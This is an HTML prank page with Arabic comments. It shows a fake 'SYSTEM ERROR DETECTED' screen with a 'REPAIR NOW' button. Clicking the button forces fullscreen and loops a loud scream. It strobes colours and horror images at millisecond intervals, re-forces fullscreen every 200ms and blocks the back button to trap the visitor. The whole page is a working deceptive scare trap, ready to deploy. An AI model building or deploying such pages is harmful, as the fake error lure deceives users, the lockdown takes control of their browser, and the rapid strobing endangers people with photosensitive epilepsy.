<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CRITICAL SYSTEM FAILURE</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; cursor: none; }
        
        /* شاشة التمويه سواسوة */
        #gate { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #fff; z-index: 10000; display: flex; 
            flex-direction: column; justify-content: center; align-items: center; 
        }
        .btn-fix { 
            background: #ff0000; color: #fff; border: 10px solid #000; 
            padding: 30px 60px; font-size: 30px; font-weight: bold; 
            border-radius: 50px; cursor: pointer; box-shadow: 0 10px 0 #800;
        }

        /* أنيميشن ألوان الفيروسات سواسوة */
        @keyframes flash_rgb {
            0% { background: #f00; } 25% { background: #0f0; } 
            50% { background: #00f; } 75% { background: #ff0; } 100% { background: #f0f; }
        }
        .chaos-bg { animation: flash_rgb 0.02s infinite; }

        /* مصفوفة الصور المرعبة سواسوة */
        .horror-wrap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; }
        .h-img { 
            position: absolute; width: 100%; height: 100%; object-fit: cover; 
            opacity: 0; mix-blend-mode: difference; 
        }

        /* أنيميشن الزلزال والقفز سواسوة */
        @keyframes earthquake {
            0% { transform: scale(1.1) translate(0,0); filter: invert(0); }
            50% { transform: scale(1.5) translate(-30px, 30px) rotate(5deg); filter: invert(1); }
            100% { transform: scale(1.2) translate(30px, -30px) rotate(-5deg); }
        }
        .active-horror { opacity: 1 !important; animation: earthquake 0.01s infinite linear; }
    </style>
</head>
<body id="b">

    <div id="gate">
        <h2 style="font-family: Arial; color: #000;">SYSTEM ERROR DETECTED</h2>
        <button class="btn-fix" onclick="launchInfection()">REPAIR NOW</button>
    </div>

    <div id="horror_container" class="horror-wrap">
        <img class="h-img" id="i1" src="https://i.ibb.co/RTTgVkyw/image.jpg">
        <img class="h-img" id="i2" src="https://i.ibb.co/VYQnMt9R/image.jpg">
        <img class="h-img" id="i3" src="https://i.ibb.co/ym4GK9sk/image.jpg">
        <img class="h-img" id="i4" src="https://i.ibb.co/4H7RV4m/image.jpg">
    </div>

    <script>
        const imgIds = ['i1', 'i2', 'i3', 'i4'];
        // رابط الصوت المباشر اللي بعثته سواسوة
        const audioSrc = "https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3";

        function launchInfection() {
            document.getElementById('gate').style.display = 'none';
            document.getElementById('b').classList.add('chaos-bg');
            document.getElementById('horror_container').style.display = 'block';

            // ملء الشاشة القسري سواسوة
            let el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();

            // تشغيل الصوت الجديد بقوة سواسوة
            let audio = new Audio(audioSrc);
            audio.loop = true;
            audio.volume = 1.0;
            const playFast = () => audio.play().catch(() => setTimeout(playFast, 50));
            playFast();

            // تبديل الصور الفيروسي سواسوة
            let current = 0;
            setInterval(() => {
                document.getElementById(imgIds[current]).classList.remove('active-horror');
                current = (current + 1) % imgIds.length;
                document.getElementById(imgIds[current]).classList.add('active-horror');
            }, 40);

            // نظام الحبس (Lockdown) سواسوة
            setInterval(() => {
                if (!document.fullscreenElement) el.requestFullscreen();
                window.scrollTo(0, 0);
            }, 200);

            history.pushState(null, null, location.href);
            window.onpopstate = () => history.go(1);
        }
    </script>
</body>
</html>
